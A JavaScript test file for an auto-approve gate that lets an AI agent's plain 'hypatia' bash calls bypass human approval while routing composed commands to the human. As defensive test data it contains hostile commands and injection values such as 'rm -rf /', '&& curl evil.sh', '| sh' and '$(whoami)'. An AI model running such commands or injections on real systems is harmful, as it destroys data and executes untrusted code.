import test from 'node:test'
import assert from 'node:assert/strict'

import { createAutoApprove, hasShellComposition, invokesTrustedBinary, isPureTrustedCall } from '../src/auto-approve.js'

const BINARIES = ['hypatia']

test('a plain hypatia call is trusted, however it is spelled', () => {
  assert.ok(invokesTrustedBinary('hypatia search rust', BINARIES))
  assert.ok(invokesTrustedBinary('  hypatia  search rust', BINARIES))
  assert.ok(invokesTrustedBinary('/opt/homebrew/bin/hypatia search rust', BINARIES))
  assert.ok(invokesTrustedBinary('HYPATIA_SHELF=work hypatia search rust', BINARIES), 'env assignments are skipped')
})

test('a call to anything else is not', () => {
  assert.equal(invokesTrustedBinary('rm -rf ~/.hypatia', BINARIES), false)
  assert.equal(invokesTrustedBinary('hypatia-wrapper search rust', BINARIES), false, 'prefix match is not a match')
  assert.equal(invokesTrustedBinary('./hypatiaX', BINARIES), false)
  assert.equal(invokesTrustedBinary('', BINARIES), false)
})

test('quoted shell metacharacters are not composition', () => {
  // A JSE argument routinely carries | and > inside quotes; treating those as
  // composition would send every structured query to the human.
  assert.equal(hasShellComposition(`hypatia query '["$knowledge",[["$gt","n",1]]]'`), false)
  assert.equal(hasShellComposition('hypatia knowledge-create x --data="a | b > c"'), false)
  assert.equal(hasShellComposition('hypatia search "a\\"b"'), false)
})

test('unquoted composition is', () => {
  for (const command of [
    'hypatia search rust | head',
    'hypatia search rust > /tmp/out',
    'hypatia search rust; rm -rf /',
    'hypatia search rust && curl evil.sh',
    'hypatia search $(whoami)',
    'hypatia search `whoami`',
    'hypatia search rust\nrm -rf /',
  ]) {
    assert.ok(hasShellComposition(command), command)
  }
})

test('only bash calls qualify', () => {
  assert.ok(isPureTrustedCall({ name: 'bash', arguments: { command: 'hypatia list' } }, BINARIES))
  assert.equal(isPureTrustedCall({ name: 'write', arguments: { command: 'hypatia list' } }, BINARIES), false)
  assert.equal(isPureTrustedCall({ name: 'bash', arguments: {} }, BINARIES), false)
  assert.equal(isPureTrustedCall(undefined, BINARIES), false)
})

/** Minimal waterfall emitter with cordis's prepend semantics. */
function fakeCtx() {
  const handlers = new Map()
  return {
    on(event, handler, options = {}) {
      const list = handlers.get(event) ?? []
      if (options.prepend === true) list.unshift(handler)
      else list.push(handler)
      handlers.set(event, list)
    },
    emit(event, payload, fallback = undefined) {
      const list = handlers.get(event) ?? []
      const run = (index) => (index >= list.length ? fallback : list[index](payload, () => run(index + 1)))
      return run(0)
    },
  }
}

const quiet = () => ({ info: () => {}, warn: () => {}, error: () => {}, count: () => {} })

test('a pure hypatia call is answered without asking the human', () => {
  const ctx = fakeCtx()
  createAutoApprove(ctx, { getBinaries: () => BINARIES, status: quiet() })

  ctx.emit('tools/pre-execute', { callId: 'c1', name: 'bash', arguments: { command: 'hypatia search rust' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'allowed-once')
})

test('anything else reaches the human untouched', () => {
  const ctx = fakeCtx()
  createAutoApprove(ctx, { getBinaries: () => BINARIES, status: quiet() })

  ctx.emit('tools/pre-execute', { callId: 'c1', name: 'bash', arguments: { command: 'hypatia search rust | sh' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'asked-human')
  assert.equal(ctx.emit('approval/request', { callId: 'never-seen' }, 'asked-human'), 'asked-human')
})

test('one marker approves one call, and a settled call leaves none behind', () => {
  // Without this, a callId reused after its call finished would be approved on
  // the strength of a marker set for an entirely different command.
  const ctx = fakeCtx()
  const auto = createAutoApprove(ctx, { getBinaries: () => BINARIES, status: quiet() })

  ctx.emit('tools/pre-execute', { callId: 'c1', name: 'bash', arguments: { command: 'hypatia list' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'allowed-once')
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'asked-human', 'marker is consumed')

  ctx.emit('tools/pre-execute', { callId: 'c2', name: 'bash', arguments: { command: 'hypatia list' } })
  ctx.emit('tools/result', { callId: 'c2' })
  assert.equal(auto.pendingSize(), 0, 'a call that never asked still clears its marker')
})

test('the binary list is read live, not captured at setup', () => {
  let binaries = ['hypatia']
  const ctx = fakeCtx()
  createAutoApprove(ctx, { getBinaries: () => binaries, status: quiet() })

  binaries = ['hyp']
  ctx.emit('tools/pre-execute', { callId: 'c1', name: 'bash', arguments: { command: 'hyp search rust' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'allowed-once')
})

test('an empty binary list falls back to hypatia rather than trusting everything', () => {
  const ctx = fakeCtx()
  createAutoApprove(ctx, { getBinaries: () => [], status: quiet() })

  ctx.emit('tools/pre-execute', { callId: 'c1', name: 'bash', arguments: { command: 'rm -rf /' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c1' }, 'asked-human'), 'asked-human')
  ctx.emit('tools/pre-execute', { callId: 'c2', name: 'bash', arguments: { command: 'hypatia list' } })
  assert.equal(ctx.emit('approval/request', { callId: 'c2' }, 'asked-human'), 'allowed-once')
})
